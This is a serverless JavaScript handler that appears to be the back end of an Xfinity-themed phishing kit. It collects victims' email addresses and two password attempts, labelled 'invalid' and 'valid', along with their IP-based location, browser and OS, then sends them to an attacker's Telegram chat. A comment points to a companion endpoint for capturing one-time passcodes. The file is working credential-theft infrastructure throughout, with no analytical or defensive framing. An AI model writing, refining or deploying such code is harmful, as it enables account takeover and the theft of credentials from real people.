const UAParser = require('ua-parser-js');

// --- Configuration ---
const CONFIG = {
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  },
  FETCH_TIMEOUT: 15000,
  GEO_API_FIELDS: 'country,regionName,query',
};

// --- Helper Functions (Unchanged) ---

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';

const getClientIp = (event) => {
  const headers = event.headers || {};
  return (getHeader(headers, 'x-forwarded-for') ||
          getHeader(headers, 'x-real-ip') ||
          getHeader(headers, 'cf-connecting-ip') ||
          event.requestContext?.identity?.sourceIp ||
          'Unknown').toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
  };
};

// --- Markdown Escaping ---
const escapeMarkdown = (text) => {
  if (!text) return text;
  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
};

// --- Message Composers ---

/**
 * Composes the message for login credentials.
 * This function remains structurally the same.
 * @param {object} data - The parsed request body.
 * @returns {string}
 */
const composeCredentialsMessage = (data) => {
    const {
        email, provider, firstAttemptPassword, secondAttemptPassword,
        clientIP, location, deviceDetails, timestamp, sessionId,
    } = data;

    const safeEmail = escapeMarkdown(email || 'Not captured');
    const safeFirstPw = escapeMarkdown(firstAttemptPassword);
    const safeSecondPw = escapeMarkdown(secondAttemptPassword);
    const safeProvider = escapeMarkdown(provider || 'Others');
    const safeIP = escapeMarkdown(clientIP);
    const safeRegion = escapeMarkdown(location.regionName);
    const safeCountry = escapeMarkdown(location.country);
    const safeOS = escapeMarkdown(deviceDetails.os);
    const safeBrowser = escapeMarkdown(deviceDetails.browser);
    const safeDevice = escapeMarkdown(deviceDetails.deviceType);
    const safeSessionId = escapeMarkdown(sessionId);

    const passwordSection = `🔑 First (invalid): ${safeFirstPw}\n🔑 Second (valid): ${safeSecondPw}`;

    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'UTC', hour12: true
    }) + ' UTC';

    return `
*🔐 XfinityBoxResults - Credentials 🔐*

*ACCOUNT DETAILS*
- 📧 Email: ${safeEmail}
- 🏢 Provider: *${safeProvider}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: ${safeIP}
- 🌍 Location: *${safeRegion}, ${safeCountry}*
- 💻 OS: *${safeOS}*
- 🌐 Browser: *${safeBrowser}*
- 🖥️ Device Type: *${safeDevice}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: ${safeSessionId}
`;
};

// --- Main Handler (credentials only — OTP is handled by sendOtp function) ---
exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }
  
  try {
    const data = JSON.parse(event.body || '{}');

    // Validate: this endpoint handles credentials ONLY.
    // Reject any payload that looks like an OTP submission.
    if (data.otp || !data.email || !data.firstAttemptPassword) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' }),
      };
    }

    const clientIP = getClientIp(event);
    const location = await getIpAndLocation(clientIP);
    const deviceDetails = getDeviceDetails(data.userAgent);
    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);

    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
    const message = composeCredentialsMessage(messageData);

    // Send the composed message to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return {
        statusCode: 502,
        headers,
        body: JSON.stringify({ success: false, error: 'Failed to send credentials message.' }),
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, sessionId: data?.sessionId }),
    };

  } catch (error) {
    console.error('Function execution error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
